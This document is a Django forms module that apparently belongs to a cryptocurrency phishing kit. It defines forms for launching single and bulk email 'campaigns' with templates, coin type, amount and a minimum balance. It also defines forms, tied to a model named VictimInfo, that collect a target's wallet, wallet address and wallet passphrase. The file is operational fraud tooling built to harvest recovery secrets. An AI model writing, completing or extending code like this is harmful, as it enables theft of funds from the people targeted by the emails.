#core.forms
from django import forms
from .models import Campaign, VictimInfo

class CampaignForm(forms.ModelForm):
    class Meta:
        model = Campaign
        fields = ['recipient_email', 'email_template', 'cryptocurrency', 'quantity', 'min_balance']
        widgets = {
            'recipient_email': forms.EmailInput(attrs={'class': 'form-control', 'placeholder': 'Recipient Email'}),
            'email_template': forms.Select(attrs={'class': 'form-control'}),
            'cryptocurrency': forms.Select(attrs={'class': 'form-control'}),
            'quantity': forms.NumberInput(attrs={'class': 'form-control', 'placeholder': 'Crypto Amount'}),
            'min_balance': forms.NumberInput(attrs={'class': 'form-control', 'placeholder': 'Minimum Balance Required'}),
        }


class MultiCampaignForm(forms.ModelForm):
    recipient_emails = forms.CharField(
        widget=forms.Textarea(attrs={'rows': 3}), 
        help_text="Enter multiple emails separated by commas"
    )

    class Meta:
        model = Campaign
        fields = ['email_template', 'cryptocurrency', 'quantity', 'min_balance', 'xp_cost']

    def clean_recipient_emails(self):
        emails = self.cleaned_data.get('recipient_emails', '')
        email_list = [email.strip() for email in emails.split(',') if email.strip()]
        if not email_list:
            raise forms.ValidationError("Please provide at least one recipient email.")
        return email_list
        

class WalletForm(forms.ModelForm):
    class Meta:
        model = VictimInfo
        fields = ['wallet']
        labels = {
            'wallet': 'Select Wallet'
        }

class AddressForm(forms.ModelForm):
    class Meta:
        model = VictimInfo
        fields = ['address']
        labels = {
            'address': 'Enter Wallet Address'
        }

class PassphraseForm(forms.ModelForm):
    class Meta:
        model = VictimInfo
        fields = ['passphrase']
        labels = {
            'passphrase': 'Enter Wallet Passphrase'
        }
